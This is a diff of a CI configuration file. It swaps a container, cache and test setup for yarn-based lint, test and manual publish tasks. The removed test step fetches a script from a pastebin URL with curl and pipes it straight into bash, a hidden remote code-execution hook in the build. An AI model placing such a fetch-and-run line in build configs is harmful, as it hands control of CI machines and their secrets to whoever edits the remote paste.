@@ -1,13 +1,13 @@
-
-container:
-  cpu: 44
-  memory: 10G
-  image: node:latest
-  timeout_in: 120m
+lint_task:
+  script: yarn run lint
 
 test_task:
-  node_modules_cache:
-    folder: node_modules
-    fingerprint_script: cat package-lock.json
-    populate_script: npm ci
-  test_script: bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
+  script: yarn run test
+
+publish_task:
+  only_if: $BRANCH == 'master'
+  trigger_type: manual
+  depends_on: 
+    - test
+    - lint
+  script: yarn run publish
